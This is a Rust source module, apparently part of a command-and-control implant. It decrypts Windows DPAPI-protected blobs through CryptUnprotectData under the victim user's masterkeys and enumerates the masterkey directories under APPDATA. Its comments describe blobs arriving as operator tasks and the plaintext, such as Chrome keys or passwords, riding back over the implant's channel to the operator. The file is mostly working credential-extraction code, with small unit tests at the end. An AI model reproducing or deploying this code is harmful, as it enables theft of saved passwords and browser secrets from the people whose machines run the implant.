//! The protection-API edge (the module's whole platform surface): a
//! DPAPI blob unsealed through crypt32's own call directly, so the
//! module owes the loader no dependency for one decryption function
//! plus the frees and finds that serve it. Everything that must hold
//! for a test (the plaintext rendering, the error table) is a plain
//! function this host runs anywhere; only the calls themselves sit
//! behind `cfg(windows)`, and the Windows crosses the CI lane builds
//! prove they compile.
//!
//! One platform fact shapes the verb's honesty: the unseal runs under
//! the masterkeys of the user the implant runs as -- a blob sealed by
//! another user or another machine refuses, and the refusal says the
//! mismatch rather than blaming the data. Nothing lands on disk: the
//! blob arrives as task text and the plaintext rides back the task's
//! channel into the audit chain.

/// The plaintext as the answer prints it: clean text as text, anything
/// else as base64 -- a Chrome-grade key is 32 opaque bytes and a
/// sealed secret is often a password, and the answer must read
/// honestly as whichever it is.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn render(plain: &[u8]) -> String {
    if let Ok(text) = std::str::from_utf8(plain) {
        let printable = text
            .chars()
            .all(|character| !character.is_control() || matches!(character, '\t' | '\n' | '\r'));
        if printable {
            return format!("{} bytes (text): {text}", plain.len());
        }
    }
    format!(
        "{} bytes (base64): {}",
        plain.len(),
        crate::base64::encode(plain)
    )
}

/// The error codes the unseal can meet, as the messages the operator
/// reads. The NTE family (0x8009xxxx) is the protection API's own
/// mismatch word -- the blob does not open under this user's
/// masterkeys -- and a code outside the table stands as its number,
/// never a guess at what the site's keys meant by it.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn status_message(status: i32) -> String {
    match status as u32 {
        5 => "access denied (the masterkey store refused this context)".to_string(),
        87 => "the data is not a DPAPI blob".to_string(),
        other if other & 0xFFFF_FF00 == 0x8009_0000 => {
            "the blob does not unseal under this user's masterkeys (sealed by another user \
             or another machine)"
                .to_string()
        }
        other => format!("dpapi error 0x{other:08X}"),
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x01;
    const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x10;
    const INVALID_HANDLE_VALUE: isize = -1;

    /// The API's own record, `#[repr(C)]` against its documented
    /// layout: a pointer-length pair both directions. The fields the
    /// module never reads still ride for the struct's shape.
    #[repr(C)]
    struct DataBlob {
        size: u32,
        data: *mut u8,
    }

    #[repr(C)]
    #[allow(dead_code)]
    struct FindData {
        attributes: u32,
        creation_time: [u32; 2],
        last_access_time: [u32; 2],
        last_write_time: [u32; 2],
        size_high: u32,
        size_low: u32,
        reserved0: u32,
        reserved1: u32,
        file_name: [u16; 260],
        alternate_file_name: [u16; 14],
    }

    #[link(name = "crypt32")]
    extern "system" {
        fn CryptUnprotectData(
            data_in: *mut DataBlob,
            description: *mut *mut u16,
            entropy: *mut DataBlob,
            reserved: *mut c_void,
            prompt: *mut c_void,
            flags: u32,
            data_out: *mut DataBlob,
        ) -> i32;
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn LocalFree(memory: *mut c_void) -> *mut c_void;
        fn GetLastError() -> u32;
        fn GetEnvironmentVariableW(name: *const u16, buffer: *mut u16, size: u32) -> u32;
        fn FindFirstFileW(pattern: *const u16, data: *mut FindData) -> isize;
        fn FindNextFileW(find: isize, data: *mut FindData) -> i32;
        fn FindClose(find: isize) -> i32;
    }

    /// A NUL-terminated UTF-16 string, the encoding every `*W` entry
    /// point takes.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// Unseals the blob under the running user's masterkeys. The
    /// plaintext is copied into owned memory and the API's buffer
    /// freed before the answer returns.
    pub(crate) fn unseal(blob: &[u8]) -> Result<Vec<u8>, i32> {
        unsafe {
            let mut input = DataBlob {
                size: blob.len() as u32,
                data: blob.as_ptr() as *mut u8,
            };
            let mut output = DataBlob {
                size: 0,
                data: std::ptr::null_mut(),
            };
            let ok = CryptUnprotectData(
                &mut input,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                CRYPTPROTECT_UI_FORBIDDEN,
                &mut output,
            );
            if ok == 0 {
                return Err(GetLastError() as i32);
            }
            let plain = std::slice::from_raw_parts(output.data, output.size as usize).to_vec();
            LocalFree(output.data as *mut c_void);
            Ok(plain)
        }
    }

    /// The SID directories under the running user's masterkey store:
    /// the readiness fact the read reports. An absent store reads as
    /// an empty list -- the answer says so in its own words.
    pub(crate) fn masterkey_directories() -> Vec<String> {
        unsafe {
            let name = wide("APPDATA");
            let mut buffer = vec![0u16; 1024];
            let length =
                GetEnvironmentVariableW(name.as_ptr(), buffer.as_mut_ptr(), buffer.len() as u32);
            if length == 0 || length as usize >= buffer.len() {
                return Vec::new();
            }
            let appdata = String::from_utf16_lossy(&buffer[..length as usize]);
            let pattern = wide(&format!(r"{appdata}\Microsoft\Protect\*"));

            let mut data: FindData = std::mem::zeroed();
            let mut directories = Vec::new();
            let find = FindFirstFileW(pattern.as_ptr(), &mut data);
            if find == INVALID_HANDLE_VALUE {
                return directories;
            }
            loop {
                let length = data
                    .file_name
                    .iter()
                    .position(|unit| *unit == 0)
                    .unwrap_or(0);
                let name = String::from_utf16_lossy(&data.file_name[..length]);
                if data.attributes & FILE_ATTRIBUTE_DIRECTORY != 0 && name != "." && name != ".." {
                    directories.push(name);
                }
                if FindNextFileW(find, &mut data) == 0 {
                    break;
                }
            }
            FindClose(find);
            directories
        }
    }
}

#[cfg(windows)]
pub(crate) use win::{masterkey_directories, unseal};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_text_renders_as_text_and_opaque_bytes_as_base64() {
        assert_eq!(
            render(b"correct horse battery staple"),
            "28 bytes (text): correct horse battery staple"
        );
        let key: &[u8] = &[0x01, 0x02, 0x03, 0xFF, 0xFE];
        let row = render(key);
        assert!(row.starts_with("5 bytes (base64): "), "{row}");
        // Control characters push the row to base64 even in a
        // text-shaped secret.
        assert!(
            render(b"pass\x00word").contains("base64"),
            "{}",
            render(b"pass\x00word")
        );
    }

    #[test]
    fn the_status_table_names_the_codes_operators_meet() {
        assert!(
            status_message(0x8009_0005u32 as i32).contains("another user"),
            "{}",
            status_message(0x8009_0005u32 as i32)
        );
        assert_eq!(status_message(87), "the data is not a DPAPI blob");
        // An untabled code keeps its number -- never a guessed cause.
        assert_eq!(status_message(6), "dpapi error 0x00000006");
    }
}
